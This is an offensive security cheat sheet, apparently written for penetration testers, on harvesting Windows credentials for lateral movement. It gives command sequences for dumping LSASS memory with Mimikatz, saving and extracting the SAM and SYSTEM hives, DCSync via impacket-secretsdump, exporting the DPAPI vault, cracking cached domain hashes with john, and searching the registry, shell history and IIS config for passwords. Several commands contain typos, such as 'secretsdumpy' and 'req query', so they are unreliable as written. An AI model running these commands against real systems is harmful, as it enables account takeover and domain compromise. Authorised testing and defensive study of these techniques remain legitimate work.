Credential Harvest

Let's go farming :)

Some of these techniques require local admin privileges. The goal is to farm creds for lateral movement.

Defenses will scream, so use it wisely.

Local Security Authority Subsystem Service (LSASS): Manages authentication and holds sensitive creds min memory. NTLM and LM hashes, Kerberos tickets, and plaintext. Needs SYSTEM-level access. Dumping triggers defender. Mimikatz - sekurlsa::logonpasswords, sekurlsa::minidump.

Security Accounts Manager (SAM) + SYSTEM Hives: SAM is a windows registry database that stores pass hashes for local users. Hashes are encrypted, need the BootKey from SYSTEM hive. Mimikatz - lsadump::samvssadmin.

  • SAM - %SystemRoot%\system32\config\SAM
  • SYSTEM - %SystemRoot%zsystem32\config\SYSTEM

Local Security Authority (LSA) Secrets: HKLM\SECURITY\Policy\Secrets - cached domain creds for offline logons, cleartext pass for scheduled tasks or services, RDP session pass. Can be accessed by SYSTEM and Admin via Local Security Authority Remote Protocol (LSARPC). secretsdump.py with local admin creds. .

Data Protection API (DPAPI): Win crypto service for protecting apps secrets. DPAPI vault defines a mster key per user to encrypt creds (wi-fi pass, browser logins, ...). Master key is encrypted with key derived from user's pass and is stored in %APPDATA%\Microsoft\Protect. Mimikatz - vault::list, vault::cred /export.

NTDS.dit: Core AD database, only in DCs. Domain user accounts, computer objects, service principals, NTLM pass hashes and Kerberos key. secretsdump.py -just-dc lsadump::dcsync.

MS-Cache v2 (aka DCC2) password hashes. DCC2 hashes are Domain Cached Credentials stored locally on Windows machines.

Check Autologon​

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>null | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword

DPAPI Vault dumping​

# list vaults
vault::list

# export creds
vault::cred /export

SAM and SYSTEM Hive​

# save it to a file
reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM

reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SYSTEM

# dump hashes from SAM and SYSTEM
lsadump::sam /sam:"C:\<PATH>\SAM" /system:"C:\<PATH\SYSTEM"

Secretsdump​

  • -just-dc skips the local SAM/LSA hive dumping and performs only the DRSUAPI ("DCSync") extraction of the domain's NTDS.dit.
impacket-secretsdump <domain>/'<user>':'<password>'@<ip> -output local_dump

# just dc, need Domain Admin
impacket-secretsdump <domain>/<user>:<pass>@<ip> -just-dc -output dc_dump

# save DCC2 hashes
# crack it
john --format=mscash2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

LSA Secrets​

# check privs
privilege::debug

# elevate token to system
token::elevate

# dump
lsadump::cache

LSASS mem​

# check privs, needs local admin
privilege::debug

# read creds from LSASS
sekurlsa::logonpasswords

Saved creds​

# list
cmdkey /list

# run as
runas.exe /savecred /user:<user> cmd

runas /user:<user> cmd.exe

Secretsdump​

# need admin | nxc (!pwned)
impacket-secretsdumpy <host>/<user>:<pass>@<ip> -output local_dump

Shell History​

# CMD
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# Powershell
Get-Content (Get-PSReadLineOption).HistorySavePath

IIS Config​

type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

Registry​

# creds from software
reg query HKEY_CURRENT_USER\Software\<user>\<software>\Sessions\ /f "Proxy" /s

# needs admin
req query "HKLM\Security\Cache"

# search in registry
reg query HKLM /f "password" /t REG_SZ /s
